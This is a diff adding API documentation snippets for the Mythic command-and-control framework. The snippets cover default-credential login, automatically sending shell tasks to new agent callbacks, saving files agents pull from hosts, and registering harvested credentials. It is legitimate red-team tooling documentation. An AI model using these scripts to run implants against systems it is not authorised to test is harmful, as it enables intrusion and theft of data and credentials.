+        server_port=7443,
+        timeout=-1
+    )
+```
+
+--------------------------------
+
+### Get File Browser Data on a Specific Host
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Filebrowser.ipynb
+
+Retrieves all file browser data for a specific host. Specify a batch size for efficient retrieval.
+
+```python
+# ################ Get file browser data on host ################
+async for data in mythic.get_all_filebrowser(mythic=mythic_instance, host="SPOOKY.LOCAL", batch_size=10):
+    print(f"Got data! {data}\n")
+```
+
+--------------------------------
+
+### Login to Mythic Instance
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/EventingExamples/taskIntercept.ipynb
+
+Establishes a connection to a Mythic server instance using provided credentials and server details. Set timeout to -1 for indefinite waiting.
+
+```python
+mythic_instance = await mythic.login(
+        username="mythic_admin",
+        password="mythic_password",
+        server_ip="mythic_nginx",
+        server_port=7443,
+        timeout=-1
+    )
+```
+
+--------------------------------
+
+### Get All Callbacks with Custom Attributes
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/CustomQueries.ipynb
+
+Retrieves all callbacks from Mythic, allowing for specific attributes to be returned using a custom GraphQL query.
+
+```python
+# ################ Provide custom attributes for pre-built query ################
+custom_attributes = """
+host
+user
+payload {
+    id
+    uuid
+}
+"
+"
+result = await mythic.get_all_callbacks(
+    mythic=mythic_instance, custom_return_attributes=custom_attributes
+)
+print(result)
+```
+
+--------------------------------
+
+### Get Task and Subtask Output by ID
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Tasking.ipynb
+
+Retrieves all output for a specified task ID, including output from any subtasks that were generated by the primary task.
+
+```python
+# ################ Get all task output a single task and all subtasks of that task ################
+responses = await mythic.get_all_task_and_subtask_output_by_id(mythic=mythic_instance, task_display_id=25)
+print(responses)
+```
+
+--------------------------------
+
+### Execute Custom GraphQL Query
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/CustomQueries.ipynb
+
+Executes a raw GraphQL query against the Mythic API to retrieve specific operation details. This example fetches operation ID, name, and associated operators.
+
+```python
+# ################ Custom query ################
+operation = await mythic.execute_custom_query(
+    mythic=mythic_instance,
+    query="""
+    query specificOperation{
+        operation(where: {name: {_eq: "Operation Chimera"}}) {
+            id
+            name
+            operators {
+                id
+                username
+            }
+        }
+    }
+",
+)
+print(operation)
+```
+
+--------------------------------
+
+### Get All File Browser Data on a Specific Host
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Filebrowser.ipynb
+
+Retrieves all available file browser data for a specific host in batches. This is useful for fetching historical or complete file browser states.
+
+```APIDOC
+## get_all_filebrowser (host)
+
+### Description
+Gets all file browser data on a specific host. This is a generator that yields data in batches.
+
+### Parameters
+#### Path Parameters
+- **mythic** (MythicInstance) - Required - An authenticated Mythic instance object.
+- **host** (string) - Required - The hostname to retrieve file browser data from.
+- **batch_size** (int) - Optional - The number of items to retrieve in each batch. Defaults to 10.
+
+### Response
+#### Success Response (yields data)
+- **data** (list) - A list of dictionaries, where each dictionary represents file browser data for the specified host.
+
+### Request Example
+```python
+async for data in mythic.get_all_filebrowser(mythic=mythic_instance, host="SPOOKY.LOCAL", batch_size=10):
+    print(f"Got data! {data}\n")
+```
+```
+
+--------------------------------
+
+### Login to Mythic Instance
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/EventingExamples/responseIntercept.ipynb
+
+Establishes a connection to the Mythic server. Ensure your server IP, port, and credentials are correct. A timeout of -1 indicates no timeout.
+
+```python
+from mythic import mythic
+
+mystic_instance = await mythic.login(
+        username="mythic_admin",
+        password="mythic_password",
+        server_ip="mythic_nginx",
+        server_port=7443,
+        timeout=-1
+    )
+```
+
+--------------------------------
+
+### Get All Task Output by ID
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Tasking.ipynb
+
+Retrieves all output associated with a specific task ID. This includes output from the task and any subtasks it may have generated.
+
+```python
+# ################ Get all output for a given task ################
+responses = await mythic.get_all_task_output_by_id(mythic=mythic_instance, task_display_id=14)
+print(responses)
+```
+
+--------------------------------
+
+### Login to Mythic Instance
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/C2Profiles.ipynb
+
+Establishes a connection to the Mythic server. Ensure correct credentials and server details are provided. The timeout=-1 means the connection will not time out.
+
+```python
+from mythic import mythic
+```
+
+```python
+mythic_instance = await mythic.login(
+        username="mythic_admin",
+        password="mythic_password",
+        server_ip="mythic_nginx",
+        server_port=7443,
+        timeout=-1
+    )
+print(mythic_instance)
+```
+
+--------------------------------
+
+### Login to Mythic Instance
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/OperatorsAndOperations.ipynb
+
+Establishes a connection to the Mythic server. Ensure correct credentials and server details are provided. A timeout of -1 indicates no timeout.
+
+```python
+from mythic import mythic, mythic_classes
+```
+
+```python
+mythic_instance = await mythic.login(
+        username="mythic_admin",
+        password="mythic_password",
+        server_ip="mythic_nginx",
+        server_port=7443,
+        timeout=-1
+    )
+```
+
+--------------------------------
+
+### Configure NGINX Host, Port, and SSL
+
+Source: https://github.com/its-a-feature/mythic/blob/master/Mythic_CLI/Changelog.md
+
+Introduces NGINX_HOST, NGINX_PORT, and NGINX_SSL environment variables to be passed into InstalledService containers.
+
+```bash
+NGINX_HOST=example.com
+```
+
+```bash
+NGINX_PORT=8080
+```
+
+```bash
+NGINX_SSL=true
+```
+
+--------------------------------
+
+### Login to Mythic Instance
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/AgentMessages.ipynb
+
+Establishes a connection to the Mythic server. Ensure your username, password, and server details are correct. A timeout of -1 means it will wait indefinitely.
+
+```python
+from mythic import mythic
+```
+
+```python
+mythic_instance = await mythic.login(
+        username="mythic_admin",
+        password="mythic_password",
+        server_ip="mythic_nginx",
+        server_port=7443,
+        timeout=-1
+    )
+```
+
+--------------------------------
+
+### Login to Mythic
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/AuthenticateToMythic.ipynb
+
+Establishes a connection to the Mythic server using provided credentials and returns an authenticated instance.
+
+```APIDOC
+## login
+
+### Description
+Authenticates with the Mythic server and returns an authenticated instance.
+
+### Method
+`mythic.login`
+
+### Parameters
+- **username** (string) - Required - The username for authentication.
+- **password** (string) - Required - The password for authentication.
+- **server_ip** (string) - Required - The IP address or hostname of the Mythic server.
+- **server_port** (integer) - Required - The port number for the Mythic server.
+- **timeout** (integer) - Optional - The connection timeout in seconds. -1 indicates no timeout.
+
+### Request Example
+```python
+mythic_instance = await mythic.login(
+    username="mythic_admin",
+    password="mythic_password",
+    server_ip="mythic_nginx",
+    server_port=7443,
+    timeout=-1
+)
+```
+
+### Response
+- **mythic_instance** (object) - An authenticated Mythic instance object.
+```
+
+--------------------------------
+
+### Get or Create Tag Type - Mythic API
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/FullScriptExamples/TagAllProcesses.ipynb
+
+Retrieves the ID of an existing tag type or creates a new one if it doesn't exist. This is essential for organizing and categorizing tagged items.
+
+```python
+async def get_tag_type(mythic_instance: mythic.mythic_classes.Mythic, tag_type_name: str) -> int:
+    global current_tag_types
+    for tag_type in current_tag_types:
+        if tag_type["name"] == tag_type_name:
+            return tag_type["id"]
+    # create the tagtype and add it to the running list
+    new_tag_type = await mythic.create_tag_type(mythic=mythic_instance, color=tagtypeDefinitions[tag_type_name]["color"],
+                                                description=tagtypeDefinitions[tag_type_name]["description"],
+                                                name=tag_type_name)
+    current_tag_types.append({**new_tag_type, "name": tag_type_name})
+    return new_tag_type["id"]
+```
+
+--------------------------------
+
+### Pass Server Invite Link Setting
+
+Source: https://github.com/its-a-feature/mythic/blob/master/Mythic_CLI/Changelog.md
+
+The `mythic_server_allow_invite_links` setting is now passed into the mythic_server container.
+
+```bash
+mythic_server_allow_invite_links=true
+```
+
+--------------------------------
+
+### Login to Mythic Server
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Payloads.ipynb
+
+Establish a connection to the Mythic server using credentials and server details. The timeout can be set to -1 for no timeout.
+
+```python
+mythic_instance = await mythic.login(
+        username="mythic_admin",
+        password="mythic_password",
+        server_ip="mythic_nginx",
+        server_port=7443,
+        timeout=-1
+    )
+```
+
+--------------------------------
+
+### Register a New File with Mythic
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Files.ipynb
+
+Registers a new file with Mythic, providing its name and content. The content must be in bytes.
+
+```python
+# ################ Register a new file with Mythic ################
+resp = await mythic.register_file(
+   mythic=mythic_instance, filename="test.txt", contents=b"this is a test"
+)
+print(f"registered file UUID: {resp}")
+```
+
+--------------------------------
+
+### Subscribe to New Callbacks and Issue Tasks
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/OnEventDoX.ipynb
+
+Subscribe to new callback events and, for each new callback, issue a 'shell' task to execute 'whoami'. This is useful for automatically responding to new agent check-ins.
+
+```python
+# ########## On new callback issue task ###########
+async for callbacks in mythic.subscribe_new_callbacks(mythic=mythic_instance, batch_size=10):
+    print(callbacks)  # array based on batch size for how many to return at once
+    for callback in callbacks:
+        status = await mythic.issue_task(
+            mythic=mythic_instance,
+            command_name="shell",
+            parameters={"command": "whoami"},
+            callback_display_id=callback["display_id"],
+            wait_for_complete=False,
+        )
+        print(f"Issued a task: {status}")
+```
+
+--------------------------------
+
+### Subscribe to All Tasks and Updates
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Tasking.ipynb
+
+Retrieves all existing tasks and then subscribes to new tasks along with their updates for a given callback. This allows tracking task progression.
+
+```python
+# ################ get all old tasks and subscribe to all new tasks (and get their updates) ################
+# get multiple results for each task as it goes through various processing stages
+async for result in mythic.subscribe_all_tasks_and_updates(mythic=mythic_instance, callback_display_id=9, timeout=30):
+    print(result)
+```
+
+--------------------------------
+
+### Subscribe to Downloaded Files and Save to Disk
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/OnEventDoX.ipynb
+
+Subscribe to events where files are downloaded by agents. For each downloaded file, fetch its content and save it to the local disk with a filename incorporating the original filename and agent file ID.
+
+```python
+# ########## On file download, fetch file and write to disk ###########
+async for result in mythic.subscribe_all_downloaded_files(mythic=mythic_instance, batch_size=1):
+    for completed_file in result:
+        file_bytes = await mythic.download_file(mythic=mythic_instance, file_uuid=completed_file["agent_file_id"])
+        with open(f"{completed_file['filename_utf8']}-{completed_file['agent_file_id']}", 'wb') as f:
+            f.write(file_bytes)
+```
+
+--------------------------------
+
+### Import Mythic Library
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/FullScriptExamples/TagAllProcesses.ipynb
+
+Imports the necessary Mythic library and asyncio for asynchronous operations.
+
+```python
+import asyncio
+from mythic import mythic
+```
+
+--------------------------------
+
+### Import Mythic Library
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/EventingExamples/taskIntercept.ipynb
+
+Imports the necessary Mythic library for interacting with the Mythic C2 framework.
+
+```python
+from mythic import mythic
+```
+
+--------------------------------
+
+### Subscribe to Task Output and Create Credentials
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/OnEventDoX.ipynb
+
+Subscribe to all task output events. If the output is from a specific command ('my special command'), decode the response and register it as a credential within Mythic.
+
+```python
+# ########## On agent output, check if it's a certain command and parse the output to register credentials ###########
+async for responses in mythic.subscribe_all_task_output(mythic=mythic_instance):
+    for response in responses:
+        if response["task"]["command_name"] == "my special command":
+            data = base64.b64decode(response["response_text"]).decode()
+            await mythic.create_credential(mythic=mythic_instance, credential=data, realm="parsed realm", account="associated account", comment="auto populated from scripting")
+```
+
+--------------------------------
+
+### Import Mythic Libraries
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/MultipleSubscriptionsAtOnce.ipynb
+
+Imports the necessary Mythic libraries and asyncio for asynchronous operations.
+
+```python
+from mythic import mythic, mythic_classes
+import asyncio
+```
+
+--------------------------------
+
+### Enable Dynamic Docker Compose Files
+
+Source: https://github.com/its-a-feature/mythic/blob/master/Mythic_CLI/Changelog.md
+
+Supports `COMPOSE_FILE` in `.env` for dynamically composing multiple Docker compose files.
+
+```bash
+export COMPOSE_FILE=docker-compose.yml:docker-compose.override.yml
+```
+
+--------------------------------
+
+### Update Mythic Server Allow Invite Links
+
+Source: https://github.com/its-a-feature/mythic/blob/master/Mythic_CLI/Changelog.md
+
+Updated `mythic_server_allow_invite_links` to be passed into the `mythic_server` container.
+
+```bash
+mythic_server_allow_invite_links
+```
+
+--------------------------------
+
+### Initialize Tag Types
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/FullScriptExamples/TagAllProcesses.ipynb
+
+Initializes an empty list to store current tag types.
+
+```python
+current_tag_types = []
+```
+
+--------------------------------
+
+### Subscribe to New Task Output
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Tasking.ipynb
+
+Asynchronously iterate over new task output for the entire operation. Requires an active Mythic instance.
+
+```python
+async for response in mythic.subscribe_new_task_output(mythic=mythic_instance):
+        print(response)
+```
+
+--------------------------------
+
+### Download a File Without Chunking
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Files.ipynb
+
+Downloads an entire file from Mythic as a single byte string. Use this for smaller files where chunking is unnecessary.
+
+```python
+# ################ Downloading a file without chunking ################
+file_bytes = await mythic.download_file( mythic=mythic_instance, file_uuid=resp )
+print(file_bytes)
+```
+
+--------------------------------
+
+### Update All Containers
+
+Source: https://github.com/its-a-feature/mythic/blob/master/Mythic_CLI/Changelog.md
+
+Updated all containers to include all `extra_host` fields.
+
+```bash
+extra_hosts:
+```
+
+--------------------------------
+
+### Subscribe to All Processes
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Processes.ipynb
+
+Subscribes to real-time updates for all processes across all hosts connected to the Mythic server. The loop breaks after the first data packet.
+
+```python
+# ################ Subscribe to processes ################
+async for data in mythic.subscribe_all_processes(mythic=mythic_instance):
+    print(data)
+    break
+```
+
+--------------------------------
+
+### Subscribe to New Processes
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Processes.ipynb
+
+Subscribes to newly created processes. This can optionally be filtered by host and has a configurable batch size.
+
+```APIDOC
+## subscribe_new_processes (host, batch_size)
+
+### Description
+Subscribes to newly created processes, optionally filtered by host.
+
+### Parameters
+#### Path Parameters
+- **mythic** (object) - Required - The Mythic instance object.
+- **host** (string) - Optional - The hostname to subscribe new processes from.
+- **batch_size** (integer) - Optional - The number of new processes to retrieve in each batch.
+
+#### Query Parameters
+None
+
+### Request Body
+None
+
+### Response
+#### Success Response (200)
+- **resp** (object) - Description of the new process event data.
+
+### Response Example
+```json
+{
+  "example": "new_process_data"
+}
+```
+```
+
+--------------------------------
+
+### Configure Mythic Docker Networking
+
+Source: https://github.com/its-a-feature/mythic/blob/master/Mythic_CLI/Changelog.md
+
+Allows setting `mythic_docker_networking` to `bridge` or `host` for all main Mythic services.
+
+```bash
+mythic_docker_networking=bridge
+```
+
+```bash
+mythic_docker_networking=host
+```
+
+
+读取https://docs.mythic-c2.net/version-4.0/home该站点全部的文档,确保你已经完全理解.
